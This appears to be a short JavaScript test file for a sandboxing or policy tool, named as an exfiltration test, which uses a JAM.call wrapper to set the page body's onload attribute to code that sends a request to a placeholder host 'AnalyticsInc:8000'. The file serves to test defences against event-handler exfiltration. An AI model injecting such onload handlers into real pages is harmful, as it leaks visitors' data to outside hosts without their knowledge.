// exfil_test_onload1.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onload1", true);xmlhttp.send(null);';
var v0 = document.body;
JAM.call(v0.setAttribute, v0, ["onload", exp])
